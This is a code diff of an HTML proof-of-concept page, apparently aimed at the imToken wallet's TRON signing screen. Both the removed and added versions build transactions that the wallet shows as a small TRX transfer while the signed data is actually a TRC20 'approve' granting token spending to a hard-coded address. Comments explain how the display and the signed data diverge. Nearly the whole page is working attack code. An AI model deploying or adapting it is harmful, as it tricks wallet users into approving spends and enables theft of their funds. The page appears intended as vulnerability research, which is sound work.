@@ -1,173 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>imToken Field Override PoC</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <title>imToken TRON 测试</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #1a1a1a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: #2d2d2d; padding: 20px; border-radius: 12px; width: 90%; max-width: 400px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-        h2 { text-align: center; color: #4ecca3; margin-top: 0; }
-        p { font-size: 14px; color: #aaa; text-align: center; margin-bottom: 20px; }
-        button { width: 100%; padding: 15px; background: #4ecca3; border: none; border-radius: 8px; color: #1a1a1a; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
-        button:hover { background: #3ba886; }
-        button:disabled { background: #555; cursor: not-allowed; }
-        #status { margin-top: 15px; font-size: 12px; color: #888; text-align: center; word-break: break-all; }
-        .info { font-size: 12px; color: #666; text-align: center; margin-top: 10px; line-height: 1.4; }
+        body{font-family:system-ui,sans-serif;background:#111;color:#0f0;padding:20px;text-align:center}
+        button{padding:18px 40px;font-size:18px;background:#0b8;margin:20px;border:none;border-radius:8px;cursor:pointer}
+        .info{margin:15px;padding:15px;background:#222;border-radius:6px}
     </style>
 </head>
 <body>
-<div class="box">
-    <h2>View: Sign: </h2>
-    <p id="preview-text">点击按钮发起测试</p>
-    <button id="btn" onclick="runPoc()">发起“转账”测试</button>
-    <div id="status"></div>
-    <div class="info">
-        漏洞原理：<br>
-        UI解析器认为这是 Transfer (Type 1)<br>
-        底层解析器将其覆盖为 TriggerSmartContract (Type 1)<br>
-        最终授权 TEfF... 地址
-    </div>
-</div>
-<script>
-    // 配置
-    const TARGET_ADDR = "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz";
-    const APPROVE_AMOUNT = "1000000000"; // 示例金额 (6位小数合约)
-   
-    // TRC20 Approve 函数选择器: 095ea7b3...
-    const SELECTOR = "095ea7b3";
-   
-    let tronWeb;
+    <h1>imToken TRON 测试页面</h1>
+    <div class="info">点击按钮将显示发送 0.1 TRX<br>实际可能为 USDT Approve</div>
+    <button onclick="sendTx()">发送 0.1 TRX</button>
 
-    // 初始化
-    async function init() {
-        try {
-            tronWeb = new TronWeb({
-                fullHost: 'https://api.trongrid.io',
-                headers: { 'TRON-PRO-API-KEY': '' }
-            });
-           
-            // 兼容 imToken / TronLink 注入
-            if (window.tronWeb) tronWeb = window.tronWeb;
-            else if (window.tronLink && window.tronLink.tronWeb) tronWeb = window.tronLink.tronWeb;
-
-            if (!tronWeb || !tronWeb.defaultAddress) {
-                document.getElementById('status').innerText = "未检测到钱包插件，请在 imToken DApp 浏览器中打开";
+    <script>
+        async function sendTx() {
+            if (!window.imToken) {
+                alert("请在 imToken DApp 浏览器中打开");
                 return;
             }
 
-            // 正确获取 Base58 地址（修复核心 bug）
-            let userAddress = tronWeb.defaultAddress.base58;
-            if (!userAddress) {
-                userAddress = tronWeb.address.fromHex(tronWeb.defaultAddress.hex);
+            try {
+                const account = await window.imToken.callPromisifyAPI("tron.getAccount");
+                const owner = account.address;
+
+                const payload = {
+                    "raw_data": {
+                        "contract": [{
+                            "type": "TransferContract",
+                            "parameter": {
+                                "value": {
+                                    "owner_address": owner,
+                                    "to_address": "TEfFnhxxeRbghthqJ4dSbAK4mqAtkJbSAz",
+                                    "amount": 100000
+                                }
+                            }
+                        }],
+                        "ref_block_bytes": "0x0000",
+                        "ref_block_hash": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                        "expiration": Date.now() + 3600000,
+                        "timestamp": Date.now()
+                    },
+                    "raw_data_hex": "0a0200002208" + "0".repeat(64) + "40" + "0".repeat(10) + "5a6a0a31747970652e676f6f676c65617069732e636f6d2f70726f746f636f6c2e54726967676572536d617274436f6e747261637412350a1541" + owner.slice(2) + "121541a614f803b6fd780986a42c78ec9c7f77e6ded13c2244095ea7b300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+                };
+
+                const result = await window.imToken.callPromisifyAPI("tron.sendTransaction", payload);
+                console.log(result);
+                alert("交易提交成功！请检查确认页显示与链上结果");
+            } catch(e) {
+                console.error(e);
+                alert("错误: " + e.message);
             }
-
-            console.log("已获取地址:", userAddress);
-            updateUI(true);
-        } catch (e) {
-            document.getElementById('status').innerText = "初始化失败: " + e.message;
         }
-    }
-
-    // 执行主流程
-    async function runPoc() {
-        const btn = document.getElementById('btn');
-        const status = document.getElementById('status');
-        btn.disabled = true;
-        status.innerText = "正在构建交易...";
-
-        try {
-            // 1. 构造 Data: approve(address,uint256)
-            const targetHex = tronWeb.address.toHex(TARGET_ADDR);
-            const amountHex = BigInt(APPROVE_AMOUNT).toString(16); // 修复兼容性
-            const paddedAmount = '0'.repeat(64 - amountHex.length) + amountHex;
-            const contractData = SELECTOR + targetHex.substring(2) + paddedAmount;
-
-            // 2. 构造两个 Contract 对象（利用 JSON 键名冲突覆盖）
-            const contracts = [
-                {
-                    type_url: "type.googleapis.com/protocol.TransferContract",
-                    value: {
-                        owner_address: tronWeb.defaultAddress.base58, // 已修复
-                        to_address: TARGET_ADDR,
-                        amount: 1000000 // 1 TRX = 1,000,000 SUN
-                    }
-                },
-                {
-                    type_url: "type.googleapis.com/protocol.TriggerSmartContract",
-                    value: {
-                        owner_address: tronWeb.defaultAddress.base58,
-                        contract_address: TARGET_ADDR,
-                        data: contractData
-                    }
-                }
-            ];
-
-            // 3. 获取当前区块（修复 async 调用）
-            const block = await tronWeb.trx.getCurrentBlock();
-            const blockId = block.blockID || block.id;
-
-            // 4. 构建 RawData
-            const rawData = {
-                ref_block_bytes: blockId.substring(12, 16), // 修复
-                ref_block_hash: blockId.substring(16, 32),
-                expiration: Date.now() + 30000,
-                fee_limit: 100000, // 0.1 TRX = 100,000 SUN
-                timestamp: Date.now(),
-                contract: contracts
-            };
-
-            // 5. 构建 Transaction 对象（用于签名）
-            const transaction = {
-                visible: true,
-                txID: tronWeb.trx.transactionHash(rawData),
-                raw_data: rawData
-            };
-
-            status.innerText = "正在请求 imToken 签名...";
-
-            // 6. 签名（兼容 imToken / TronLink）
-            let signedTx;
-            if (window.tronLink) {
-                signedTx = await window.tronLink.tronWeb.trx.sign(transaction);
-            } else if (tronWeb.defaultAddress?.privateKey) {
-                signedTx = await tronWeb.trx.sign(transaction);
-            } else {
-                throw new Error("无法获取私钥，请连接钱包");
-            }
-
-            status.innerText = "签名成功，正在广播...";
-
-            // 7. 广播
-            const result = await tronWeb.trx.sendRawTransaction(signedTx);
-
-            if (result.ret && result.ret.length > 0 && result.ret[0].contractRet === 'SUCCESS') {
-                status.innerText = "✅ 成功! TXID: " + result.txid;
-                document.getElementById('preview-text').innerText = "View: Transfer 1 TRX\nSign: Approve " + APPROVE_AMOUNT + " tokens to " + TARGET_ADDR.substring(0,4) + "...";
-            } else {
-                status.innerText = "❌ 广播失败: " + JSON.stringify(result);
-            }
-        } catch (e) {
-            console.error(e);
-            status.innerText = "错误: " + e.message;
-        } finally {
-            btn.disabled = false;
-        }
-    }
-
-    function updateUI(connected) {
-        const btn = document.getElementById('btn');
-        if (connected) {
-            btn.innerText = "发起“转账”测试";
-        } else {
-            btn.innerText = "连接钱包中...";
-            btn.disabled = true;
-        }
-    }
-
-    // 启动
-    init();
-</script>
+    </script>
 </body>
 </html>
